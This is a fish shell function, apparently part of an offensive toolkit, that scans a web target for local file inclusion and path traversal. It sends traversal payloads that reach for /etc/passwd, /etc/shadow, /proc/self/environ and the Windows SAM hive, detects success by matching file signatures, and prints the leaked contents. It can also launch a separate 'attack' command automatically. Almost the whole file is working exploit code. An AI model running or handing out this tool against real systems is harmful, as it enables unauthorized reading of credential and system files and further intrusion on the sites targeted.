function lfi
    argparse -n lfi 'p/param=' 'depth=' 'os=' 'auto' 'attack' 'h/help' -- $argv
    or return

    if set -q _flag_help
        echo "Usage: lfi <target> [options]"
        echo "  -p <param>    Parameter to test (default: ?file=)"
        echo "  --depth <n>   Traversal depth (default: 5)"
        echo "  --os <type>   linux|windows (default: linux)"
        echo "  --auto        Non-interactive output"
        echo "  --attack      Attack target on find"
        echo "Tests for path traversal / LFI."
        return
    end

    if test (count $argv) -lt 1
        echo "Error: target URL required"
        return 1
    end

    set target $argv[1]
    if not string match -qr '^https?://' "$target"
        set target "https://$target"
    end

    set param "file"
    if set -q _flag_param; set param $_flag_param; end
    set depth 5
    if set -q _flag_depth; set depth $_flag_depth; end
    set os "linux"
    if set -q _flag_os; set os $_flag_os; end

    echo (set_color cyan)"==> LFI SCAN: $target"(set_color normal)
    echo (set_color brblack)"    Parameter: $param | Depth: $depth | OS: $os"(set_color normal)

    # Build traversal string
    set traversal ""
    for i in (seq $depth)
        set traversal "$traversal../"
    end

    if test "$os" = "linux"
        set files "/etc/passwd" "/etc/shadow" "/etc/hosts" "/etc/hostname" "/proc/self/environ" "/proc/version" "/etc/issue"
    else
        set files "windows\\win.ini" "windows\\system32\\drivers\\etc\\hosts" "boot.ini" "windows\\system32\\config\\SAM"
    end

    set found 0
    set found_files

    for file in $files
        set payload "$traversal$file"
        set url "$target?$param=$payload"
        # Also try URL-encoded
        set enc_payload (python3 -c "import urllib.parse; print(urllib.parse.quote(\"$payload\", safe=''))" 2>/dev/null)
        set url_enc "$target?$param=$enc_payload"

        for u in "$url" "$url_enc"
            set resp (curl -sS --max-time 10 "$u" 2>/dev/null)
            if test -z "$resp"; continue; end

            set detected 0
            if test "$os" = "linux"
                if echo "$resp" | grep -q 'root:[x*]:0:0:'; set detected 1; end
                if echo "$resp" | grep -q '/bin/bash'; set detected 1; end
                if echo "$resp" | grep -q '127.0.0.1.*localhost'; set detected 1; end
            else
                if echo "$resp" | grep -qi '\[fonts\]'; set detected 1; end
                if echo "$resp" | grep -qi 'for 16-bit app support'; set detected 1; end
            end

            if test $detected -eq 1
                set found (math $found + 1)
                set -a found_files "$file"
                set size (echo "$resp" | wc -c | string trim)
                echo (set_color green)"  [LFI] $file -> $size bytes"(set_color normal)
                if set -q _flag_attack
                    echo (set_color brblack)"  First 200 chars:"(set_color normal)
                    echo "$resp" | head -c 200
                    echo ""
                end
                break
            end
        end
    end

    if test $found -eq 0
        echo (set_color yellow)"  No LFI detected with depth $depth"(set_color normal)
        echo (set_color brblack)"  Try --depth with higher value or different --param"(set_color normal)
    else
        echo (set_color green)"  $found file(s) accessible:"(set_color normal)
        for f in $found_files; echo "    $f"; end
        if not set -q _flag_auto
            echo ""
            echo -n "Launch attack? [y/N] "
            read -l ans
            if test "$ans" = "y" -o "$ans" = "Y"
                attack "$target"
            end
        end
    end

    if set -q _flag_attack
        attack "$target"
    end
end
